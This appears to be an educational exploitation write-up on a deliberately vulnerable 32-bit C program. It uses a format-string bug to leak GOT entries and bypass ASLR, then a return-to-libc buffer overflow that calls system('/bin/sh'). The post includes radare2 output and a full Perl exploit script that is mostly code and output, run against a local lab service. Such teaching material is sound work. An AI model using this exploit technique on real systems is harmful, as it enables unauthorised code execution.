## Example: printing the GOT table for leaking libc offsets

Enabling ASLR (kernel setting)
```bash
root# echo 2 > /proc/sys/kernel/randomize_va_space
root# exit
$ ldd ./fmt_arbitrary_read
	linux-gate.so.1 =>  (0xb776b000)
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb75b2000)
	/lib/ld-linux.so.2 (0xb776e000)
$ ldd ./fmt_arbitrary_read
	linux-gate.so.1 =>  (0xb7778000)
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb75bf000)
	/lib/ld-linux.so.2 (0xb777b000)
$ ldd ./fmt_arbitrary_read
	linux-gate.so.1 =>  (0xb770b000)
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7552000)
	/lib/ld-linux.so.2 (0xb770e000)
```

```c
#include<stdio.h>

/* 
The goal of this executable is to use the format 
string vulnerability to leak the GOT.PLT table. 
Using this, we can calculate the libc base address
(ASLR should be enabled in the kernel) to then
correctly overflow the buffer with the system()
address and /bin/sh address (calculated with the
libc base address + offset).

Assumption is that we have the libc of course.
*/

void main() {
	char format_string[64];
	printf("Hello there.\n");
	printf("Give me a format string: ");
	fflush(stdout);
	fgets(format_string, 63, stdin); format_string[63] = 0;
	printf("You requested the following string to be printed: '%s'\n", format_string);
	printf("Unsafe printing: ");
	printf(format_string);
	printf("\nNow that you know my secrets, do a return-to-libc by smashing this stack: ");
	fflush(stdout);
	char small_buffer[4];
	gets(small_buffer);
	printf("\nGoodbye, I will now leave you to wherever...\n");
	fflush(stdout);
}
```

Compiling:
```
$ gcc -m32 -fno-stack-protector -o to_system fmt_arbitrary_read_to_system.c  
$ checksec --file to_system 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	FORTIFY	FORTIFIED FORTIFY-able
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   No	0		6	
```

When printf is already called (first four hex bytes in output), the address changes to the actual resolved location of printf, so by printing the global offset table, we leak the location of libc.
```
┌ (fcn) sym.imp.printf 6
 |||||||   0x080483b0      ff250ca00408   jmp dword [reloc.printf_12] ; 0x804a00c
┌ (fcn) sym.imp.fflush 6
└  ||||||   0x080483c0      ff2510a00408   jmp dword [reloc.fflush_16] ; 0x804a010
┌ (fcn) sym.imp.gets 6
└   |||||   0x080483d0      ff2514a00408   jmp dword [reloc.gets_20]   ; 0x804a014
┌ (fcn) sym.imp.fgets 6
└    ||||   0x080483e0      ff2518a00408   jmp dword [reloc.fgets_24]  ; 0x804a018
┌ (fcn) sym.imp.puts 6
└     |||   0x080483f0      ff251ca00408   jmp dword [reloc.puts_28]   ; 0x804a01c
┌ (fcn) loc.imp.__gmon_start__ 6
└      ||   0x08048400      ff2520a00408   jmp dword [reloc.__gmon_start___32] ; 0x804a020
<snip>
[0x08048350]> px 128 @ 0x0804a00c
- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0x0804a00c  80d2 64b7 6683 0408 7683 0408 8683 0408  ..d.f...v.......
0x0804a01c  9099 61b7 a683 0408 0000 0000 0000 0000  ..a.............
0x0804a02c  0000 0000 0000 0000 0000 0000 0000 0000  ................
0x0804a03c  0000 0000 0000 0000 0000 0000 0000 0000  ................
0x0804a04c  0000 0000 0000 0000 0000 0000 0000 0000  ................
0x0804a05c  0000 0000 0000 0000 0000 0000 0000 0000  ................
0x0804a06c  0000 0000 0000 0000 0000 0000 0000 0000  ................
0x0804a07c  0000 0000 0000 0000 0000 0000 0000 0000  ................
[0x08048350]> dm
<snip>
sys 1.7M 0xb7600000 - 0xb77a8000 s -r-x /lib/i386-linux-gnu/libc-2.19.so /lib/i386-linux-gnu/libc-2.19.so
```

So we now the global offset table with function pointers starts at 0x0804a00c. ASLR does not change this! What does change is the actual location of libc functions (well libc in general). So let's get the offset into libc that our functions are at.
```
$ r2 -A /lib/i386-linux-gnu/libc.so.6 
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze len bytes of instructions for references (aar)
[x] Analyze function calls (aac)
[ ] [*] Use -AA or aaaa to perform additional experimental analysis.
[x] Constructing a function name for fcn.* and sym.func.* functions (aan))
 -- Have you seen the latest radare2 TV spot?
[0x00019be0]> afl~gets
0x0002cff0   10 204  -> 198  sym.catgets
0x000408e0   14 284  -> 278  sym.getsubopt
0x00063b20   25 374  -> 320  sym.fgets
0x00064cd0   25 390  -> 336  sym.gets
0x00069660   11 163  -> 157  sym.fgets_unlocked
<snip>
[0x00019be0]> afl~fflush
0x00063810   18 56720 -> 207  sym.fflush
0x00069400    3 56   -> 82   sym.fflush_unlocked
[0x00019be0]> afl~puts
0x000640a0   26 349  -> 289  sym.fputs
0x00065650   29 446  -> 390  sym._IO_puts
0x00069710    8 151  -> 140  sym.fputs_unlocked
0x000f1050   73 1056 -> 1036 sym.putspent
0x000f2860   33 521  -> 514  sym.putsgent
[0x00019be0]> afl~printf
<snip>
0x0004c940   16 216  -> 225  sym.register_printf_type
0x0004ca20  119 2048 -> 1983 sym.printf_size
0x0004d220    3 42           sym.printf_size_info
0x0004d250    1 35           sym._IO_fprintf
0x0004d280    1 52           sym._IO_printf
0x0004d2c0    1 56           sym.snprintf
0x0004d300    1 35           sym.sprintf
<snip>
[0x00019be0]> afl~system
0x00040190   62 152  -> 1325 sym.__libc_system
0x00119240    1 73           sym.svcerr_systemerr
[0x00019be0]> iz~/bin/sh
vaddr=0x00160a24 paddr=0x00160a24 ordinal=633 sz=8 len=7 section=.rodata type=ascii string=/bin/sh
```

My solution (cut up in pieces to be easy digestable). First just connect to the executable which we ran with `$ socat -v tcp-l:1337,fork exec:'./to_system'`
```perl
use strict;
use warnings;
use IO::Socket::INET;

#####
my $ip = "127.0.0.1";
my $port = 1337;
my $protocol = "tcp";
my $got_table = "\x0c\xa0\x04\x08";
#####

my $socket = new IO::Socket::INET(
    PeerHost => $ip,
    PeerPort => $port,
    Proto => $protocol,
);
die "[-] Could not connect: $!\n" unless $socket;
print "[+] Connected to $ip:$port\n";

# Receive line of text
$socket->recv(my $response, 5000);
print "[+] Response: $response\n";
```

Now the program is expecting a (format) string input, we use this to leak the got table:
```perl
my $fmt = "${got_table}%8\$s\n";
print "[+] Sending format string ...\n";
$socket->send($fmt, 5000);

# Receive line of text
$socket->recv($response, 5000);
print "[+] Response: $response\n";

# Parse response
$response =~ /Unsafe printing: (.+)\nNow that/s;
my $got_bytes = $1;
my @addresses = unpack("V*", $got_bytes);
foreach(@addresses) {
	printf("[+] Address leaked: 0x%08x\n", $_);
}
#[+] Address leaked: 0x0804a00c <-- Just our 4 uninterpreted bytes from our format string :)
#[+] Address leaked: 0xb75d9280 <-- printf
#[+] Address leaked: 0xb75ef810 <-- fflush
#[+] Address leaked: 0x080483d6 <-- gets
#[+] Address leaked: 0xb75efb20 <-- fgets
#[+] Address leaked: 0xb75f1650 <-- puts
#[+] Address leaked: 0x08048406 <-- __gmon_start__
#[+] Address leaked: 0xb75a5990 <-- ?
```

After correctly parsing the output into pointers, we map them (manually) to the functions they represent. We also make a mapping for the offset of certain interesting functions and strings:
```perl 
my %leaked_addresses = (
	'printf' => $addresses[1],
	'fflush' => $addresses[2],
	'gets' => $addresses[3],
	'fgets' => $addresses[4],
	'puts' => $addresses[5]
);

my %symbol_base_addr = (
	'gets' => 0x00064cd0,
	'fgets' => 0x00063b20,
	'fflush' => 0x00063810,
	'puts' => 0x00065650,
	'printf' => 0x0004d280,
	'system' => 0x00040190,
	'/bin/sh' => 0x00160a24
);

foreach(keys(%leaked_addresses)) {
	print "[-] According to $_ the base address is: " . ($leaked_addresses{$_} - $symbol_base_addr{$_}) . "\n";
}
```

We can now calculate the address where libc resides in memory. `fflush` is resolved at this point and will correctly give us the base address of libc by substracting the offset of fflush in libc to the leaked address. Having the libc address, we can now calculate the position of system() and "/bin/sh":
```perl
my $leaked_libc_base_addr = $leaked_addresses{fflush} - $symbol_base_addr{fflush};
print "[-] Leaked base address: $leaked_libc_base_addr\n";
my $system_addr = $leaked_libc_base_addr + $symbol_base_addr{system};
my $binsh_addr = $leaked_libc_base_addr + $symbol_base_addr{'/bin/sh'};
printf("[-] System() = 0x%08x, /bin/sh = 0x%08x\n", $system_addr, $binsh_addr);
# [0x00019be0]> afl~gets
# 0x0002cff0   10 204  -> 198  sym.catgets
# 0x000408e0   14 284  -> 278  sym.getsubopt
# 0x00063b20   25 374  -> 320  sym.fgets
# 0x00064cd0   25 390  -> 336  sym.gets
# 0x00069660   11 163  -> 157  sym.fgets_unlocked
# <snip>
# [0x00019be0]> afl~fflush
# 0x00063810   18 56720 -> 207  sym.fflush
# 0x00069400    3 56   -> 82   sym.fflush_unlocked
# [0x00019be0]> afl~puts
# 0x000640a0   26 349  -> 289  sym.fputs
# 0x00065650   29 446  -> 390  sym._IO_puts
# 0x00069710    8 151  -> 140  sym.fputs_unlocked
# 0x000f1050   73 1056 -> 1036 sym.putspent
# 0x000f2860   33 521  -> 514  sym.putsgent
# [0x00019be0]> afl~printf
# <snip>
# 0x0004c940   16 216  -> 225  sym.register_printf_type
# 0x0004ca20  119 2048 -> 1983 sym.printf_size
# 0x0004d220    3 42           sym.printf_size_info
# 0x0004d250    1 35           sym._IO_fprintf
# 0x0004d280    1 52           sym._IO_printf
# 0x0004d2c0    1 56           sym.snprintf
# 0x0004d300    1 35           sym.sprintf
# <snip>
# [0x00019be0]> iz~/bin/sh
# vaddr=0x00160a24 paddr=0x00160a24 ordinal=633 sz=8 len=7 section=.rodata type=ascii string=/bin/sh
```

So now we have the actual libc address of the running instance despite randomized by ASLR as well as calculated the position of system() and the "/bin/sh" string in libc. Time to overflow the buffer and overwrite the stored eip with our address to system().

```perl

# my $buf = "AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAhAAiAAjAAkAAlAAmAAnAAoAApAAqAArAAsAAtAAuAAvAAwAAxAAyAAzAA1AA2AA3AA4AA5AA6AA7AA8AA9AA0ABBABCABDABEABFABGABHABIABJABKABLABMABNABOABPABQABRABSABTABUABVABWABXABYABZABaABbABcABdABeABfABgABhABiABjABkABlABmAB\n";
# results in: 
# --- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x41416241} ---
# +++ killed by SIGSEGV (core dumped) +++
# Segmentation fault (core dumped)
# koffiedrinker@warzone:/data/exploitation/format_strings$ r2 -
#  -- r2 -- leading options since 2006
# [0x00000000]> wopO 0x41416241
# 80

my $buf = "A" x 80 . pack("V", $system_addr) . "BBBB" . pack("V", $binsh_addr) . "\n";

print "[+] Sending buffer ...\n";
$socket->send($buf, 5000);

# Receive line of text
$socket->recv($response, 5000);
print "[+] Response: $response\n";
```

After receiving the last print statement ("Goodbye..."), we should be interacting with system() now, so send the "id" command and get the output: 
```perl 
$buf = "id\n";
$socket->send($buf, 5000);

# Receive line of text
$socket->recv($response, 5000);
print "[+] Response: $response\n";

$socket->close();
```

Running it looks like:
```bash
$ perl solution_to_system.pl 
[+] Connected to 127.0.0.1:1337
[+] Response: Hello there.
Give me a format string: 
[+] Sending format string ...
[+] Response: You requested the following string to be printed: '
                                                                 %8$s
'
Unsafe printing: 
                 ??f??g? ?g?Ph??Yc?

Now that you know my secrets, do a return-to-libc by smashing this stack: 
[+] Address leaked: 0x0804a00c
[+] Address leaked: 0xb7669280
[+] Address leaked: 0xb767f810
[+] Address leaked: 0x080483d6
[+] Address leaked: 0xb767fb20
[+] Address leaked: 0xb7681650
[+] Address leaked: 0x08048406
[+] Address leaked: 0xb7635990
[-] According to printf the base address is: 3076636672
[-] According to gets the base address is: 134100742
[-] According to fgets the base address is: 3076636672
[-] According to fflush the base address is: 3076636672
[-] According to puts the base address is: 3076636672
[-] Leaked base address: 3076636672
[-] System() = 0xb765c190, /bin/sh = 0xb777ca24
[+] Sending buffer ...
[+] Response: 
Goodbye, I will now leave you to wherever...

[+] Response: uid=1042(koffiedrinker) gid=1043(admin) groups=1043(admin),100(users),999(vboxsf)
```


